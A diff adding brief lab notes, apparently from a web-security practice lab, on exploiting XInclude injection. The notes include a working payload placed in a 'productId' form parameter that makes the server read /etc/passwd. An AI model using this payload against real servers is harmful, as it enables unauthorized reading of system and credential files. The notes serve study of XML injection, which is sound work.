@@ -1,0 +1,25 @@
+Exploiting XInclude to retrieve files
+
+
+even though the data sent in the "check store" functionality doesnt send using XML format, the server might internally build the XML
+data you sent is
+productId=1&storeId=2
+
+but server builds
+
+<stockCheck>
+    <productId>1</productId>
+    <storeId>2</storeId>
+</stockCheck>
+
+so now we now that xml format is used, the parser might have some faults and XXE might work. The problem here is that 
+we have part of the XML data and cant write the doctype since its written in the server. There is a solution though, use XInclude, using this its possible to build xml and the server includes it in the original xml file.
+so change the payload to 
+
+productId=
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+    <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+&storeId=2
+
+and you'll get the content of /etc/passwd file
